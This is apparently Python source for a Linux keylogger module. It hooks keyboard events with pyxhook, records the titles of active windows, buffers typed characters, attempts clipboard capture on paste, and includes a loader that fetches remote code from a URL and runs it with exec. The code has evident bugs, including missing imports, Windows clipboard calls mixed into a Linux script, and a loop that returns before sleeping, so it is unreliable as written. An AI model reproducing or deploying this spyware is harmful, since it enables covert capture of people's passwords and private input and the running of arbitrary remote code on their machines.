import pyxhook
import sys,os,re
from subprocess import PIPE,Popen
import time,random
#change this to your log file's path
current_window = None
charBuff = ''

def load_module(url):
    u = urllib.request.urlopen(url)
    source = u.read().decode('utf-8')
    mod = sys.modules.setdefault(url, imp.new_module(url))
    code = compile(source, url, 'exec')
    mod.__file__ = url
    mod.__package__ = ''
    exec(code, mod.__dict__)
    return mod
    
def get_current_process():
    global charBuff
    root = Popen(['xprop','-root','_NET_ACTIVE_WINDOW'],stdout=PIPE)
    
    for line in root.stdout:
        m = re.search(b'^_NET_ACTIVE_WINDOW.* ([\w]+)$', line)
        if m != None:
            id_ = m.group(1)
            id_w = Popen(['xprop','-id',id_,'WM_NAME'], stdout=PIPE)
            break

    if id_w != None:
        for line in id_w.stdout:
            match = re.match(b"WM_NAME\(\w+\) = (?P<name>.+)$",line)
            
            if match != None:
                charBuff += "**********************"+str(match.group("name"))+"**************************************\n"
                return

    charBuff+="Active window not found\n"
    return

def KeyStroke(event):    
    
    global current_window
    global charBuff
    #check to see if target changed windows 
    
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
    
    # if they pressed a standard key 
    if event.Ascii > 32 and event.Ascii < 127:
        charBuff = charBuff+chr(event.Ascii)
        #if len(charBuff) > 5:
            #print charBuff
        
    else:
        #if [ctrl-v], get the value on the clipboard
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            #print "[Paste] - %s" % (pasted_value),
        else:
            if event.Key == 'BackSpace':
                charBuff = charBuff[0:len(charBuff)-1]
            if event.Key == 'space':
                #print charBuff
                charBuff = charBuff+' '
            #print "[%s]" % event.Key,

    
    return True


def run(**args):
    global charBuff
    new_hook=pyxhook.HookManager()
    new_hook.KeyDown=KeyStroke
    new_hook.HookKeyboard()
    new_hook.start()

    while True:
        return charBuff
        time.sleep(random.randint(1,50))
        
        


